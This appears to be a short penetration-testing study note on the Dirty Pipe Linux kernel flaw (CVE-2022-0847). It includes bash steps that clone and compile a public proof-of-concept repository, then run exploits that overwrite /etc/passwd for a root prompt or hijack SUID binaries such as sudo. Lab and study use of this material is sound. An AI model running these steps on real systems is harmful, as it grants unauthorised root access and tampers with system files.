# Dirty Pipe CVE-2022-0847

[Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)) allows unauthorized writing to root user files on Linux and consider similar to [Dirty Cow](https://dirtycow.ninja/) vulnerability ([[Dirty-Cow]]) and can be used for [[Linux-Privilege-Escalation]]. All Linux Kernels affect:
5.8 to 5.17 

[GitHub - AlexisAhmed's CVE-2022-0847-DirtyPipe-Exploits PoCs](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
```bash
# Check kernel version
uname -a 

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
# exploit-1 modifies /etc/passwd and gives a promopt with root privileges
./exploit-1

# exploit-2 execute SUID binaries with root privileges
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

## References

[https://academy.hackthebox.com](https://academy.hackthebox.com)
[Dirty Pipe](https://dirtypipe.cm4all.com/) 
[Mitre CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
[Dirty Cow](https://dirtycow.ninja/) 
[GitHub - AlexisAhmed's CVE-2022-0847-DirtyPipe-Exploits PoCs](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)